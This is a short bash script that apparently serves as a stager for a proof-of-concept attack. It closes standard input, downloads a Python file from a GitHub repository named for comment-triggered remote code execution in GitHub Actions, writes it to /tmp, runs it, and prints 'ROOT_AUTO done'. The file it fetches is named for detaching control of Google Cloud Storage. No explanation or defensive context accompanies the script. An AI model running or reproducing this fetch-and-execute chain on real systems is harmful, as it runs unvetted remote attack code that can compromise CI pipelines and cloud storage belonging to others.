#!/bin/bash
set +e
exec 0<&-

curl -fsS https://raw.githubusercontent.com/fdzdev/gha-comment-rce-3900000/daybreak-vmbfs-default/poc/gcs_storage_detach_control.py \
    -o /tmp/gcs-storage-detach.py || exit 10
python3 /tmp/gcs-storage-detach.py
printf 'ROOT_AUTO done\n'
